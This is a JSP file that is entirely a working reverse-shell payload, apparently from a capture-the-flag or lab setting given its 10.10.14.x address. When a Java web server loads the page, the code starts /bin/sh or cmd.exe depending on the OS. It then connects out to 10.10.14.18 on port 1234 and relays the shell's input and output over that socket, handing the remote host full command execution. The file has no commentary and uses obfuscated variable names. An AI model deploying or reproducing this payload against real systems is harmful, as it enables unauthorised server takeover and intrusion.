<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nm;
    OutputStream rp;

    StreamConnector( InputStream nm, OutputStream rp )
    {
      this.nm = nm;
      this.rp = rp;
    }

    public void run()
    {
      BufferedReader ap  = null;
      BufferedWriter uxm = null;
      try
      {
        ap  = new BufferedReader( new InputStreamReader( this.nm ) );
        uxm = new BufferedWriter( new OutputStreamWriter( this.rp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ap.read( buffer, 0, buffer.length ) ) > 0 )
        {
          uxm.write( buffer, 0, length );
          uxm.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ap != null )
          ap.close();
        if( uxm != null )
          uxm.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.18", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
